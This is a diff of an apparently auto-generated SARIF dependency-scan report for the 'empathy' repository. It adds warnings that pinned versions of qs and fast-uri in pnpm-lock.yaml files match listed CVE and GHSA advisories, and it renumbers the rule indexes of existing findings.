@@ -676,6 +676,78 @@
         },
         {
           "partialFingerprints": {
+            "primaryLocationLineHash": "e0c5ab7927b3d851217147a9c1e0cbdbbf9c78e172b1675a99c367a08afef4a4"
+          },
+          "attachments": [],
+          "codeFlows": [],
+          "fixes": [],
+          "graphTraversals": [],
+          "graphs": [],
+          "kind": "fail",
+          "level": "warning",
+          "locations": [
+            {
+              "annotations": [],
+              "id": -1,
+              "logicalLocations": [],
+              "physicalLocation": {
+                "artifactLocation": {
+                  "index": -1,
+                  "uri": "file:///home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml"
+                }
+              },
+              "relationships": []
+            }
+          ],
+          "message": {
+            "arguments": [],
+            "text": "Package 'qs@6.15.3' is vulnerable to 'CVE-2026-82417' (also known as 'GHSA-4mjr-xmp4-gh2g')."
+          },
+          "rank": -1,
+          "relatedLocations": [],
+          "ruleId": "CVE-2026-82417",
+          "ruleIndex": 14,
+          "stacks": [],
+          "taxa": []
+        },
+        {
+          "partialFingerprints": {
+            "primaryLocationLineHash": "e860040179cc634a852184c8c2b51b428d2e3d7207a635f93d8e99386b6f6acb"
+          },
+          "attachments": [],
+          "codeFlows": [],
+          "fixes": [],
+          "graphTraversals": [],
+          "graphs": [],
+          "kind": "fail",
+          "level": "warning",
+          "locations": [
+            {
+              "annotations": [],
+              "id": -1,
+              "logicalLocations": [],
+              "physicalLocation": {
+                "artifactLocation": {
+                  "index": -1,
+                  "uri": "file:///home/runner/work/empathy/empathy/pnpm-lock.yaml"
+                }
+              },
+              "relationships": []
+            }
+          ],
+          "message": {
+            "arguments": [],
+            "text": "Package 'qs@6.15.3' is vulnerable to 'CVE-2026-82417' (also known as 'GHSA-4mjr-xmp4-gh2g')."
+          },
+          "rank": -1,
+          "relatedLocations": [],
+          "ruleId": "CVE-2026-82417",
+          "ruleIndex": 14,
+          "stacks": [],
+          "taxa": []
+        },
+        {
+          "partialFingerprints": {
             "primaryLocationLineHash": "03ebf7cb11a1a5fd1e4b3a4886a363ace865cb11e8d05575458422b5ee29c75b"
           },
           "attachments": [],
@@ -706,7 +778,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-4539",
-          "ruleIndex": 14,
+          "ruleIndex": 15,
           "stacks": [],
           "taxa": []
         },
@@ -742,7 +814,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-59869",
-          "ruleIndex": 15,
+          "ruleIndex": 16,
           "stacks": [],
           "taxa": []
         },
@@ -778,7 +850,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-54798",
-          "ruleIndex": 16,
+          "ruleIndex": 17,
           "stacks": [],
           "taxa": []
         },
@@ -814,7 +886,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "GHSA-537c-gmf6-5ccf",
-          "ruleIndex": 17,
+          "ruleIndex": 18,
           "stacks": [],
           "taxa": []
         },
@@ -850,7 +922,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-22702",
-          "ruleIndex": 18,
+          "ruleIndex": 19,
           "stacks": [],
           "taxa": []
         },
@@ -886,7 +958,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "GHSA-5c6j-r48x-rmvq",
-          "ruleIndex": 19,
+          "ruleIndex": 20,
           "stacks": [],
           "taxa": []
         },
@@ -922,7 +994,79 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "GHSA-5c6j-r48x-rmvq",
-          "ruleIndex": 19,
+          "ruleIndex": 20,
+          "stacks": [],
+          "taxa": []
+        },
+        {
+          "partialFingerprints": {
+            "primaryLocationLineHash": "12869638b3aceecb0d7043e45972135589082f8e998c12acb8e2d5604ea52783"
+          },
+          "attachments": [],
+          "codeFlows": [],
+          "fixes": [],
+          "graphTraversals": [],
+          "graphs": [],
+          "kind": "fail",
+          "level": "warning",
+          "locations": [
+            {
+              "annotations": [],
+              "id": -1,
+              "logicalLocations": [],
+              "physicalLocation": {
+                "artifactLocation": {
+                  "index": -1,
+                  "uri": "file:///home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml"
+                }
+              },
+              "relationships": []
+            }
+          ],
+          "message": {
+            "arguments": [],
+            "text": "Package 'fast-uri@3.1.5' is vulnerable to 'CVE-2026-75931' (also known as 'GHSA-5jgf-p345-68v8')."
+          },
+          "rank": -1,
+          "relatedLocations": [],
+          "ruleId": "CVE-2026-75931",
+          "ruleIndex": 21,
+          "stacks": [],
+          "taxa": []
+        },
+        {
+          "partialFingerprints": {
+            "primaryLocationLineHash": "d0ee249dad1edb524932a01a1f506f092a8346eb55c66091548752d3ce5f1bb0"
+          },
+          "attachments": [],
+          "codeFlows": [],
+          "fixes": [],
+          "graphTraversals": [],
+          "graphs": [],
+          "kind": "fail",
+          "level": "warning",
+          "locations": [
+            {
+              "annotations": [],
+              "id": -1,
+              "logicalLocations": [],
+              "physicalLocation": {
+                "artifactLocation": {
+                  "index": -1,
+                  "uri": "file:///home/runner/work/empathy/empathy/pnpm-lock.yaml"
+                }
+              },
+              "relationships": []
+            }
+          ],
+          "message": {
+            "arguments": [],
+            "text": "Package 'fast-uri@3.1.5' is vulnerable to 'CVE-2026-75931' (also known as 'GHSA-5jgf-p345-68v8')."
+          },
+          "rank": -1,
+          "relatedLocations": [],
+          "ruleId": "CVE-2026-75931",
+          "ruleIndex": 21,
           "stacks": [],
           "taxa": []
         },
@@ -958,7 +1102,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "GHSA-5p4m-2wfm-xmqj",
-          "ruleIndex": 20,
+          "ruleIndex": 22,
           "stacks": [],
           "taxa": []
         },
@@ -994,7 +1138,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-53539",
-          "ruleIndex": 21,
+          "ruleIndex": 23,
           "stacks": [],
           "taxa": []
         },
@@ -1030,7 +1174,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-31808",
-          "ruleIndex": 22,
+          "ruleIndex": 24,
           "stacks": [],
           "taxa": []
         },
@@ -1066,7 +1210,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-45409",
-          "ruleIndex": 23,
+          "ruleIndex": 25,
           "stacks": [],
           "taxa": []
         },
@@ -1102,7 +1246,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44293",
-          "ruleIndex": 24,
+          "ruleIndex": 26,
           "stacks": [],
           "taxa": []
         },
@@ -1138,7 +1282,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44289",
-          "ruleIndex": 25,
+          "ruleIndex": 27,
           "stacks": [],
           "taxa": []
         },
@@ -1174,7 +1318,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-53538",
-          "ruleIndex": 26,
+          "ruleIndex": 28,
           "stacks": [],
           "taxa": []
         },
@@ -1210,7 +1354,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-71176",
-          "ruleIndex": 27,
+          "ruleIndex": 29,
           "stacks": [],
           "taxa": []
         },
@@ -1246,7 +1390,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-32597",
-          "ruleIndex": 28,
+          "ruleIndex": 30,
           "stacks": [],
           "taxa": []
         },
@@ -1282,7 +1426,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44291",
-          "ruleIndex": 29,
+          "ruleIndex": 31,
           "stacks": [],
           "taxa": []
         },
@@ -1318,7 +1462,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-62727",
-          "ruleIndex": 30,
+          "ruleIndex": 32,
           "stacks": [],
           "taxa": []
         },
@@ -1354,7 +1498,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-27903",
-          "ruleIndex": 31,
+          "ruleIndex": 33,
           "stacks": [],
           "taxa": []
         },
@@ -1390,7 +1534,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-27903",
-          "ruleIndex": 31,
+          "ruleIndex": 33,
           "stacks": [],
           "taxa": []
         },
@@ -1426,7 +1570,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-54283",
-          "ruleIndex": 32,
+          "ruleIndex": 34,
           "stacks": [],
           "taxa": []
         },
@@ -1462,7 +1606,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-14505",
-          "ruleIndex": 33,
+          "ruleIndex": 35,
           "stacks": [],
           "taxa": []
         },
@@ -1498,7 +1642,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-14505",
-          "ruleIndex": 33,
+          "ruleIndex": 35,
           "stacks": [],
           "taxa": []
         },
@@ -1534,7 +1678,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48710",
-          "ruleIndex": 34,
+          "ruleIndex": 36,
           "stacks": [],
           "taxa": []
         },
@@ -1570,7 +1714,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-54285",
-          "ruleIndex": 35,
+          "ruleIndex": 37,
           "stacks": [],
           "taxa": []
         },
@@ -1606,7 +1750,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-55244",
-          "ruleIndex": 36,
+          "ruleIndex": 38,
           "stacks": [],
           "taxa": []
         },
@@ -1642,7 +1786,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-16728",
-          "ruleIndex": 37,
+          "ruleIndex": 39,
           "stacks": [],
           "taxa": []
         },
@@ -1678,7 +1822,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2024-4067",
-          "ruleIndex": 38,
+          "ruleIndex": 40,
           "stacks": [],
           "taxa": []
         },
@@ -1714,7 +1858,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48522",
-          "ruleIndex": 39,
+          "ruleIndex": 41,
           "stacks": [],
           "taxa": []
         },
@@ -1750,7 +1894,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "GHSA-9w56-46f6-3qhx",
-          "ruleIndex": 40,
+          "ruleIndex": 42,
           "stacks": [],
           "taxa": []
         },
@@ -1786,7 +1930,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2024-45296",
-          "ruleIndex": 41,
+          "ruleIndex": 43,
           "stacks": [],
           "taxa": []
         },
@@ -1822,7 +1966,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44660",
-          "ruleIndex": 42,
+          "ruleIndex": 44,
           "stacks": [],
           "taxa": []
         },
@@ -1858,7 +2002,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-22150",
-          "ruleIndex": 43,
+          "ruleIndex": 45,
           "stacks": [],
           "taxa": []
         },
@@ -1894,7 +2038,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-32875",
-          "ruleIndex": 44,
+          "ruleIndex": 46,
           "stacks": [],
           "taxa": []
         },
@@ -1930,7 +2074,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-47279",
-          "ruleIndex": 45,
+          "ruleIndex": 47,
           "stacks": [],
           "taxa": []
         },
@@ -1966,7 +2110,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-13465",
-          "ruleIndex": 46,
+          "ruleIndex": 48,
           "stacks": [],
           "taxa": []
         },
@@ -2002,7 +2146,79 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-54269",
-          "ruleIndex": 47,
+          "ruleIndex": 49,
+          "stacks": [],
+          "taxa": []
+        },
+        {
+          "partialFingerprints": {
+            "primaryLocationLineHash": "663364e9808b45d51a084d11b8141c3470aaa019ecd8ff3b4e8b892fe442c12d"
+          },
+          "attachments": [],
+          "codeFlows": [],
+          "fixes": [],
+          "graphTraversals": [],
+          "graphs": [],
+          "kind": "fail",
+          "level": "warning",
+          "locations": [
+            {
+              "annotations": [],
+              "id": -1,
+              "logicalLocations": [],
+              "physicalLocation": {
+                "artifactLocation": {
+                  "index": -1,
+                  "uri": "file:///home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml"
+                }
+              },
+              "relationships": []
+            }
+          ],
+          "message": {
+            "arguments": [],
+            "text": "Package 'fast-uri@3.1.5' is vulnerable to 'CVE-2026-75975' (also known as 'GHSA-f65p-4m7j-42xc')."
+          },
+          "rank": -1,
+          "relatedLocations": [],
+          "ruleId": "CVE-2026-75975",
+          "ruleIndex": 50,
+          "stacks": [],
+          "taxa": []
+        },
+        {
+          "partialFingerprints": {
+            "primaryLocationLineHash": "34a7e6bf70e4f96d842ba34d5fcefdfcc0e75cbdb7ddca08fc38b9a0efd7e963"
+          },
+          "attachments": [],
+          "codeFlows": [],
+          "fixes": [],
+          "graphTraversals": [],
+          "graphs": [],
+          "kind": "fail",
+          "level": "warning",
+          "locations": [
+            {
+              "annotations": [],
+              "id": -1,
+              "logicalLocations": [],
+              "physicalLocation": {
+                "artifactLocation": {
+                  "index": -1,
+                  "uri": "file:///home/runner/work/empathy/empathy/pnpm-lock.yaml"
+                }
+              },
+              "relationships": []
+            }
+          ],
+          "message": {
+            "arguments": [],
+            "text": "Package 'fast-uri@3.1.5' is vulnerable to 'CVE-2026-75975' (also known as 'GHSA-f65p-4m7j-42xc')."
+          },
+          "rank": -1,
+          "relatedLocations": [],
+          "ruleId": "CVE-2026-75975",
+          "ruleIndex": 50,
           "stacks": [],
           "taxa": []
         },
@@ -2038,7 +2254,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-33750",
-          "ruleIndex": 48,
+          "ruleIndex": 51,
           "stacks": [],
           "taxa": []
         },
@@ -2074,7 +2290,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48524",
-          "ruleIndex": 49,
+          "ruleIndex": 52,
           "stacks": [],
           "taxa": []
         },
@@ -2110,7 +2326,79 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-39373",
-          "ruleIndex": 50,
+          "ruleIndex": 53,
+          "stacks": [],
+          "taxa": []
+        },
+        {
+          "partialFingerprints": {
+            "primaryLocationLineHash": "a3c8c86680909842a4f4b024764778276d2f9078970de5f41e742fb9d93fb096"
+          },
+          "attachments": [],
+          "codeFlows": [],
+          "fixes": [],
+          "graphTraversals": [],
+          "graphs": [],
+          "kind": "fail",
+          "level": "warning",
+          "locations": [
+            {
+              "annotations": [],
+              "id": -1,
+              "logicalLocations": [],
+              "physicalLocation": {
+                "artifactLocation": {
+                  "index": -1,
+                  "uri": "file:///home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml"
+                }
+              },
+              "relationships": []
+            }
+          ],
+          "message": {
+            "arguments": [],
+            "text": "Package 'fast-uri@3.1.5' is vulnerable to 'CVE-2026-75899' (also known as 'GHSA-fph4-wmhf-6fwf')."
+          },
+          "rank": -1,
+          "relatedLocations": [],
+          "ruleId": "CVE-2026-75899",
+          "ruleIndex": 54,
+          "stacks": [],
+          "taxa": []
+        },
+        {
+          "partialFingerprints": {
+            "primaryLocationLineHash": "050e7f9cc85e81df51f1ad579b20c62adb7c1eb4f09f1a24f776d797b71e74e3"
+          },
+          "attachments": [],
+          "codeFlows": [],
+          "fixes": [],
+          "graphTraversals": [],
+          "graphs": [],
+          "kind": "fail",
+          "level": "warning",
+          "locations": [
+            {
+              "annotations": [],
+              "id": -1,
+              "logicalLocations": [],
+              "physicalLocation": {
+                "artifactLocation": {
+                  "index": -1,
+                  "uri": "file:///home/runner/work/empathy/empathy/pnpm-lock.yaml"
+                }
+              },
+              "relationships": []
+            }
+          ],
+          "message": {
+            "arguments": [],
+            "text": "Package 'fast-uri@3.1.5' is vulnerable to 'CVE-2026-75899' (also known as 'GHSA-fph4-wmhf-6fwf')."
+          },
+          "rank": -1,
+          "relatedLocations": [],
+          "ruleId": "CVE-2026-75899",
+          "ruleIndex": 54,
           "stacks": [],
           "taxa": []
         },
@@ -2146,7 +2434,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44292",
-          "ruleIndex": 51,
+          "ruleIndex": 55,
           "stacks": [],
           "taxa": []
         },
@@ -2182,7 +2470,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2024-6783",
-          "ruleIndex": 52,
+          "ruleIndex": 56,
           "stacks": [],
           "taxa": []
         },
@@ -2218,7 +2506,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2024-6783",
-          "ruleIndex": 52,
+          "ruleIndex": 56,
           "stacks": [],
           "taxa": []
         },
@@ -2254,7 +2542,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69247",
-          "ruleIndex": 53,
+          "ruleIndex": 57,
           "stacks": [],
           "taxa": []
         },
@@ -2290,7 +2578,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "GHSA-g7r4-m6w7-qqqr",
-          "ruleIndex": 54,
+          "ruleIndex": 58,
           "stacks": [],
           "taxa": []
         },
@@ -2326,7 +2614,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-11525",
-          "ruleIndex": 55,
+          "ruleIndex": 59,
           "stacks": [],
           "taxa": []
         },
@@ -2362,7 +2650,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-22036",
-          "ruleIndex": 56,
+          "ruleIndex": 60,
           "stacks": [],
           "taxa": []
         },
@@ -2398,7 +2686,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-25645",
-          "ruleIndex": 57,
+          "ruleIndex": 61,
           "stacks": [],
           "taxa": []
         },
@@ -2434,7 +2722,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-66418",
-          "ruleIndex": 58,
+          "ruleIndex": 62,
           "stacks": [],
           "taxa": []
         },
@@ -2470,7 +2758,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2024-4068",
-          "ruleIndex": 59,
+          "ruleIndex": 63,
           "stacks": [],
           "taxa": []
         },
@@ -2506,7 +2794,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-53550",
-          "ruleIndex": 60,
+          "ruleIndex": 64,
           "stacks": [],
           "taxa": []
         },
@@ -2542,7 +2830,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-67221",
-          "ruleIndex": 61,
+          "ruleIndex": 65,
           "stacks": [],
           "taxa": []
         },
@@ -2578,7 +2866,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-32630",
-          "ruleIndex": 62,
+          "ruleIndex": 66,
           "stacks": [],
           "taxa": []
         },
@@ -2614,7 +2902,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-45740",
-          "ruleIndex": 63,
+          "ruleIndex": 67,
           "stacks": [],
           "taxa": []
         },
@@ -2650,7 +2938,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-54282",
-          "ruleIndex": 64,
+          "ruleIndex": 68,
           "stacks": [],
           "taxa": []
         },
@@ -2686,7 +2974,79 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48523",
-          "ruleIndex": 65,
+          "ruleIndex": 69,
+          "stacks": [],
+          "taxa": []
+        },
+        {
+          "partialFingerprints": {
+            "primaryLocationLineHash": "5bbc5603fc783778e3968f3da73cef37e33b99dc763aaaa1c0d798cc0249d7ce"
+          },
+          "attachments": [],
+          "codeFlows": [],
+          "fixes": [],
+          "graphTraversals": [],
+          "graphs": [],
+          "kind": "fail",
+          "level": "warning",
+          "locations": [
+            {
+              "annotations": [],
+              "id": -1,
+              "logicalLocations": [],
+              "physicalLocation": {
+                "artifactLocation": {
+                  "index": -1,
+                  "uri": "file:///home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml"
+                }
+              },
+              "relationships": []
+            }
+          ],
+          "message": {
+            "arguments": [],
+            "text": "Package 'fast-uri@3.1.5' is vulnerable to 'CVE-2026-76172' (also known as 'GHSA-jqff-g426-hqxp')."
+          },
+          "rank": -1,
+          "relatedLocations": [],
+          "ruleId": "CVE-2026-76172",
+          "ruleIndex": 70,
+          "stacks": [],
+          "taxa": []
+        },
+        {
+          "partialFingerprints": {
+            "primaryLocationLineHash": "db47ecd7d5bc80c549863bc3a71f02ba91d3df3e773d80f8da03190ee2389ffd"
+          },
+          "attachments": [],
+          "codeFlows": [],
+          "fixes": [],
+          "graphTraversals": [],
+          "graphs": [],
+          "kind": "fail",
+          "level": "warning",
+          "locations": [
+            {
+              "annotations": [],
+              "id": -1,
+              "logicalLocations": [],
+              "physicalLocation": {
+                "artifactLocation": {
+                  "index": -1,
+                  "uri": "file:///home/runner/work/empathy/empathy/pnpm-lock.yaml"
+                }
+              },
+              "relationships": []
+            }
+          ],
+          "message": {
+            "arguments": [],
+            "text": "Package 'fast-uri@3.1.5' is vulnerable to 'CVE-2026-76172' (also known as 'GHSA-jqff-g426-hqxp')."
+          },
+          "rank": -1,
+          "relatedLocations": [],
+          "ruleId": "CVE-2026-76172",
+          "ruleIndex": 70,
           "stacks": [],
           "taxa": []
         },
@@ -2722,7 +3082,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44290",
-          "ruleIndex": 66,
+          "ruleIndex": 71,
           "stacks": [],
           "taxa": []
         },
@@ -2758,7 +3118,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69249",
-          "ruleIndex": 67,
+          "ruleIndex": 72,
           "stacks": [],
           "taxa": []
         },
@@ -2794,7 +3154,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69248",
-          "ruleIndex": 68,
+          "ruleIndex": 73,
           "stacks": [],
           "taxa": []
         },
@@ -2830,7 +3190,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-15157",
-          "ruleIndex": 69,
+          "ruleIndex": 74,
           "stacks": [],
           "taxa": []
         },
@@ -2866,7 +3226,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-34073",
-          "ruleIndex": 70,
+          "ruleIndex": 75,
           "stacks": [],
           "taxa": []
         },
@@ -2902,7 +3262,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-28684",
-          "ruleIndex": 71,
+          "ruleIndex": 76,
           "stacks": [],
           "taxa": []
         },
@@ -2938,7 +3298,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-14257",
-          "ruleIndex": 72,
+          "ruleIndex": 77,
           "stacks": [],
           "taxa": []
         },
@@ -2974,7 +3334,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-40347",
-          "ruleIndex": 73,
+          "ruleIndex": 78,
           "stacks": [],
           "taxa": []
         },
@@ -3010,7 +3370,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-39892",
-          "ruleIndex": 74,
+          "ruleIndex": 79,
           "stacks": [],
           "taxa": []
         },
@@ -3046,7 +3406,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-9679",
-          "ruleIndex": 75,
+          "ruleIndex": 80,
           "stacks": [],
           "taxa": []
         },
@@ -3082,7 +3442,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44705",
-          "ruleIndex": 76,
+          "ruleIndex": 81,
           "stacks": [],
           "taxa": []
         },
@@ -3118,7 +3478,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-42561",
-          "ruleIndex": 77,
+          "ruleIndex": 82,
           "stacks": [],
           "taxa": []
         },
@@ -3154,7 +3514,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44288",
-          "ruleIndex": 78,
+          "ruleIndex": 83,
           "stacks": [],
           "taxa": []
         },
@@ -3190,7 +3550,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44431",
-          "ruleIndex": 79,
+          "ruleIndex": 84,
           "stacks": [],
           "taxa": []
         },
@@ -3226,7 +3586,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-34043",
-          "ruleIndex": 80,
+          "ruleIndex": 85,
           "stacks": [],
           "taxa": []
         },
@@ -3262,7 +3622,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-22701",
-          "ruleIndex": 81,
+          "ruleIndex": 86,
           "stacks": [],
           "taxa": []
         },
@@ -3298,7 +3658,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2021-23337",
-          "ruleIndex": 82,
+          "ruleIndex": 87,
           "stacks": [],
           "taxa": []
         },
@@ -3334,7 +3694,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-26007",
-          "ruleIndex": 83,
+          "ruleIndex": 88,
           "stacks": [],
           "taxa": []
         },
@@ -3370,7 +3730,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69152",
-          "ruleIndex": 84,
+          "ruleIndex": 89,
           "stacks": [],
           "taxa": []
         },
@@ -3406,7 +3766,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69152",
-          "ruleIndex": 84,
+          "ruleIndex": 89,
           "stacks": [],
           "taxa": []
         },
@@ -3442,7 +3802,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-16729",
-          "ruleIndex": 85,
+          "ruleIndex": 90,
           "stacks": [],
           "taxa": []
         },
@@ -3478,7 +3838,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "GHSA-v3rj-xjv7-4jmq",
-          "ruleIndex": 86,
+          "ruleIndex": 91,
           "stacks": [],
           "taxa": []
         },
@@ -3514,7 +3874,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-41205",
-          "ruleIndex": 87,
+          "ruleIndex": 92,
           "stacks": [],
           "taxa": []
         },
@@ -3550,7 +3910,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-2229",
-          "ruleIndex": 88,
+          "ruleIndex": 93,
           "stacks": [],
           "taxa": []
         },
@@ -3586,7 +3946,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-53540",
-          "ruleIndex": 89,
+          "ruleIndex": 94,
           "stacks": [],
           "taxa": []
         },
@@ -3622,7 +3982,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-45822",
-          "ruleIndex": 90,
+          "ruleIndex": 95,
           "stacks": [],
           "taxa": []
         },
@@ -3658,7 +4018,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-53537",
-          "ruleIndex": 91,
+          "ruleIndex": 96,
           "stacks": [],
           "taxa": []
         },
@@ -3694,7 +4054,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-1526",
-          "ruleIndex": 92,
+          "ruleIndex": 97,
           "stacks": [],
           "taxa": []
         },
@@ -3730,7 +4090,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-12151",
-          "ruleIndex": 93,
+          "ruleIndex": 98,
           "stacks": [],
           "taxa": []
         },
@@ -3766,7 +4126,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-41907",
-          "ruleIndex": 94,
+          "ruleIndex": 99,
           "stacks": [],
           "taxa": []
         },
@@ -3802,7 +4162,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-41907",
-          "ruleIndex": 94,
+          "ruleIndex": 99,
           "stacks": [],
           "taxa": []
         },
@@ -3838,7 +4198,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2020-7753",
-          "ruleIndex": 95,
+          "ruleIndex": 100,
           "stacks": [],
           "taxa": []
         },
@@ -3874,7 +4234,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48525",
-          "ruleIndex": 96,
+          "ruleIndex": 101,
           "stacks": [],
           "taxa": []
         },
@@ -3910,7 +4270,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-68146",
-          "ruleIndex": 97,
+          "ruleIndex": 102,
           "stacks": [],
           "taxa": []
         },
@@ -3946,7 +4306,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48712",
-          "ruleIndex": 98,
+          "ruleIndex": 103,
           "stacks": [],
           "taxa": []
         },
@@ -3982,7 +4342,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-32874",
-          "ruleIndex": 99,
+          "ruleIndex": 104,
           "stacks": [],
           "taxa": []
         },
@@ -4018,7 +4378,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-24486",
-          "ruleIndex": 100,
+          "ruleIndex": 105,
           "stacks": [],
           "taxa": []
         },
@@ -4054,7 +4414,79 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48818",
-          "ruleIndex": 101,
+          "ruleIndex": 106,
+          "stacks": [],
+          "taxa": []
+        },
+        {
+          "partialFingerprints": {
+            "primaryLocationLineHash": "86ad4fe72f9459f3c5c23bb7dd4315087762be9b4b85ec419106e6550c5e4720"
+          },
+          "attachments": [],
+          "codeFlows": [],
+          "fixes": [],
+          "graphTraversals": [],
+          "graphs": [],
+          "kind": "fail",
+          "level": "warning",
+          "locations": [
+            {
+              "annotations": [],
